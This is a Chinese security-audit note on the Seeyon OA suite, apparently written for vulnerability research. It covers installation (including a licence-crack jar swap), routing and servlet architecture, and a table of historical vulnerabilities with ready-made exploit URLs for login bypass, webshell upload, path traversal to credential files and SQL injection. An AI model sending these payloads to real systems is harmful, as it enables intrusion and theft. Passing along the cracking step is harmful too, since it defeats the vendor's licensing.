# Seeyon致远OA

## 环境安装

*   （1）安装mysql数据库（针对A8版本）。创建一个新的数据库，字符集设置为UTF-8。如果是A6版本，如
    `A6v6.1、A6v6.1sp1、A6v6.1sp2`，默认使用内嵌在安装包中的`postgresql`作为数据库，无需单独安装
*   （2）获取安装文件。`Seeyonxxx.zip`（安装包）、`jwycbjnoyees.jar`（破解补丁）
*   （3）在安装包中点击要安装版本`.bat`文件，如`SeeyonA8-1Install.bat`
*   （4）按照弹出的安装程序确认安装路径、配置数据库等（安装过程需要断网，否则检测到不是最新版无法进行下一步）。如果是A6版本，到数据库配置阶段可以修改`postgres`用户的密码。另外，针对A6版本，`postgresql`安装完成后不会设置`Windows`服务项，重启机器后再次启动会比较麻烦，可使用如下命令注册一个名为`pgsql`的服务项。后续可在`Windows`服务管理里启停`postgresql`服务

```text-plain
cd C:\Seeyon\A6V6.1SP2\pgsql9.2.5\bin pg_ctl.exe register -N "pgsql" -D "C:\Seeyon\A6\A6V6.1SP2\pgsql9.2.5\data"
```

*   （5）安装最后一步是账号密码设置。A6-A8.0版本默认设置`system`账户的密码。A8.1版本可定义管理员账号、密码、普通用户初始密码、S1 Agent密码。
*   （6）安装破解补丁。如果服务已经启动，需要先关闭服务。首先备份安装目录`A6\ApacheJetspeed\webapps\seeyon\WEB-INF\lib`下的`jwycbjnoyees.jar`文件，然后将其替换成补丁文件后重启服务。补丁文件下载（此补丁针对A8.1）：https://github.com/ax1sX/SecurityList/blob/main/Java_OA/jwycbjnoyees.jar
*   （7）服务启动。A6在确保postgresql数据库服务是启动的状态下，点击“致远服务”图标来启动服务。A8是通过agent+server的形式来部署的。所以需要先启动`S1 Agent`，通过双击`Seeyon\A8\S1\start.bat`或点击`SeeyonS1Agent`图标都可以实现。然后再点击“致远服务”图标（等效于`/S1/client/clent.exe`），在其“服务启动配置”中添加Agent。![致远服务部署Agent](https://github.com/ax1sX/SecurityList/blob/main/images/%E8%87%B4%E8%BF%9C%E6%9C%8D%E5%8A%A1%E9%85%8D%E7%BD%AEAgent.png)
*   （8）默认端口是80，可以在“致远服务”的“服务启动配置”中点击Agent的配置选项，对HTTP端口和JVM属性进行更改。想要对致远进行调试，可以在修改`/ApacheJetspeed/bin/catalina_custom.bat`文件，添加如下内容。

```
set JAVA_OPTS="-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005"
```
*   （9）访问`http://127.0.0.1:8085/seeyon/main.do`
*   （10）版本信息探测。http://ip:port/mobile_portal/api/verification/checkEnv

## 架构分析

致远源代码位置：`Seeyon\A8\ApacheJetspeed\webapps`。核心路由配置在`Seeyon\A8\ApacheJetspeed\webapps\seeyon\WEB-INF\web.xml`中，它默认加载`/WEB-INF/spring.xml`，而`spring.xml`加载的是`spring-session.xml`，目的就是让请求过程中的HttpSession由Spring来处理。


主要的过滤器
```
CTPCsrfGuardFilter:  *.do | *.jsp 
CTPPandaGuardFilter:  *.do ｜ /rest/* 
CTPSecurityFilter:  *.do | *.jsp | *.jspx | *.psml | /rest/* | /webOffice/* | /services/* | /getAjaxDataServlet | /getAJAXMessageServlet | /getAJAXOnlineServlet | /htmlofficeservlet | /isignaturehtmlH5servlet | /isignaturehtmlservlet | /login/sso | /login/ssologout | /m-signature/* | /ofdServlet | /office/cache/* | /officeservlet | /wpsAssistServlet | /pdfservlet | /sursenServlet | /verifyCodeImage.jpg
CharacterEncodingFilter:  *.do
GenericFilter:  *.do | *.jsp | /office/cache/* 
GlobalFilter:  /m-signature/*
RestFilter:  /rest/authentication/ucpcLogin/*
IsignatureFilter:  /isignaturehtmlH5servlet
LoginPageURLFilter:  /org/*
```

Servlet

```
CTPDispatcherServlet: *.do
AJAXOnlineServlet: /getAJAXOnlineServlet
AJAXMessageServlet: /getAJAXMessageServlet
ActionServlet: /m-signature/*
SSOLoginServlet: /login/sso
SSOLogoutServlet: /login/ssologout
AJAXDataServlet: /getAjaxDataServlet -> 反射调用类和方法 
OfficeServlet: /officeservlet
WpsAssistServlet: /wpsAssistServlet  -> 任意文件下载
PdfServlet: /pdfservlet              -> 已修复金格文件写入RCE
OfdServlet: /ofdServlet
HtmlOfficeServlet: /htmlofficeservlet -> 已修复金格文件写入RCE
ISignatureHtmlServlet: /isignaturehtmlservlet
KGHTML5Servlet: /isignaturehtmlH5servlet
VerifyCodeImageServlet: /verifyCodeImage.jpg
CtpAxis2Servlet: /axis2/* | /services/*
FileOutputService: /services/downloadService
URLShortenerServlet: /g/*
ConfigObtainServlet: /configObtain
ServerStatusCheckServlet: /serverStatusCheck
```

对于REST Web Service的配置，访问路径是`/rest/*`或`/webOffice/*`

```
    <servlet>
        <servlet-name>rest</servlet-name>
        <servlet-class>org.glassfish.jersey.servlet.ServletContainer</servlet-class>
        <init-param>
            <param-name>jersey.config.server.provider.packages</param-name>
            <param-value>
                com.seeyon.ctp.rest.resources,com.fasterxml.jackson.jaxrs,com.fasterxml.jackson.jaxrs.json,com.fasterxml.jackson.jaxrs.xml,com.seeyon.ctp.rest.filter
            </param-value>
        </init-param>
        <init-param>
            <param-name>jersey.config.server.provider.classnames</param-name>
            <param-value>com.seeyon.ctp.rest.filter.AuthorizationRequestFilter,com.seeyon.ctp.rest.filter.ResponseFilter,com.seeyon.ctp.rest.filter.WebOfficeLogFilter,org.glassfish.jersey.media.multipart.MultiPartFeature,com.seeyon.ctp.rest.filter.ResourceCheckRoleAccessFilter</param-value>
        </init-param>
        <init-param>
            <param-name>jersey.config.server.provider.scanning.recursive</param-name>
            <param-value>false</param-value>
        </init-param>
        <load-on-startup>4</load-on-startup>
    </servlet>
```
### xx.do
如果调试`/seeyon/individualManager.do?method=modifyIndividual`这个路由，会发现最终执行到`/seeyon/WEB-INF/lib/seeyon-apps-common.jar`包中`IndividualManagerController`类的`modifyIndividual`方法。这个jar包中都是Sesyon自定义的各种Controller。那么可以得知，访问xxController，大致是`xx.do?method=方法名`。Controller和访问路径的对应关系可以`/WEB-INF/cfgHome`文件夹下相应的Spring配置文件中查找。

### AJAXDataServlet

用户名密码爆破就是用的这个Servlet。本文用的A8.1中已经没有此漏洞，但是依旧存在这个Servlet。它的doPost方法也是调用的doGet，doGet的核心逻辑如下

```java
public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
  String serviceName = request.getParameter("S");
  String methodName = request.getParameter("M");
  String returnValueType = request.getParameter("RVT"); // 设置响应的类型，xml为"text/xml",否则为"text/html"
  try {
    if (this.ajaxService == null) {
        this.ajaxService = (AJAXService)AppContext.getBean("AJAXService");
    }
    AJAXRequest ajaxRequest = new AJAXRequestImpl(request, response, serviceName, methodName);
    AJAXResponse ajaxResponse = this.ajaxService.processRequest(ajaxRequest); // 反射调用service的method
}
```

接收类和方法，然后反射调用。查看AJAXService支持的Bean对象一共162个。都定义在`webapps/seeyon/WEB-INF/cfgHome/plugin/`各类文件夹下的`spring-xx-manager.xml`文件中。

在代码审计时需注意，即使某个方法存在漏洞，但反射中并没有传入方法参数的地方，所以需要找可利用的无参方法。

## 历史漏洞

|     漏洞名称     |                           访问路径                           | 影响版本 |
| :--------------: | :----------------------------------------------------------: | :------: |
| 用户名密码爆破 | `/seeyon/getAjaxDataServlet?S=ajaxOrgManager&M=isOldPasswordCorrect&CL=true&RVT=XML&P_1_String=admin&P_2_String=wy123456` | A8 |
| 任意用户密码修改 | `/seeyon/individualManager.do?method=modifyIndividual` | A8 |
| htmlofficeservlet 金格文件写入RCE  | `/seeyon/htmlofficeservlet`、`/seeyon/pdfservlet` | A8 |
| fastjson反序列化 | `/seeyon/main.do?method=changeLocale`、`/seeyon/sursenServlet` | A6 |
| webmail.do任意文件下载 | `/seeyon/webmail.do?method=doDownloadAtt&filename=xx.txt&filePath=../conf/datasourceCtp.properties` | A8 |
| 登陆绕过+任意文件上传 | `/seeyon/thirdpartyController.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip` | A8 |
| 登陆绕过+任意文件上传 | `/seeyon/ajax.do;JSESSIONID=getAjaxDataServlet?method=ajaxAction&managerName=formulaManager&requestCompress=gzip&S=ajaxEdocMan ager&M=ajaxCheckNodeHasExchangeType` | A8 |
| 目录遍历 | `/seeyonreport/ReportServer?op=fs_remote_design&cmd=design_list_file&file_path=../&currentUserName=admin&currentUserId=1&isWebReport=true` | A6 |
| wpsAssistServlet任意文件下载 | `/seeyon/wpsAssistServlet?flag=template&templateUrl=../../base/conf/datasourceCtp.properties` | A8 |
| wpsAssistServlet任意文件上传 | `/seeyon/wpsAssistServlet?flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/debugggg.jsp&fileId=2` | A8 |
| 用户Session泄漏 | `/yyoa/ext/https/getSessionList.jsp?cmd=getAll` | A6 |
| test.jsp SQL注入 | `/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20database())` | A6 |
| setextno.jsp SQL注入 | `/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999) union all select 1,2,(md5(1)),4#` | A6 |
| 配置信息泄漏 | `/yyoa/ext/trafaxserver/SystemManage/config.jsp` | A6 |
| 数据库账户泄漏 | `/yyoa/createMysql.jsp`、`/yyoa/ext/createMysql.jsp` | A6 |

在比较新的A8（202110）版本中，对于文件上传/下载，都做了如下的限制，会判断文件是否和预设的文件夹在同一目录下，从而限制了跨目录操作
```
if (!FileUtil.inDirectory(file, directory)) {...}
```
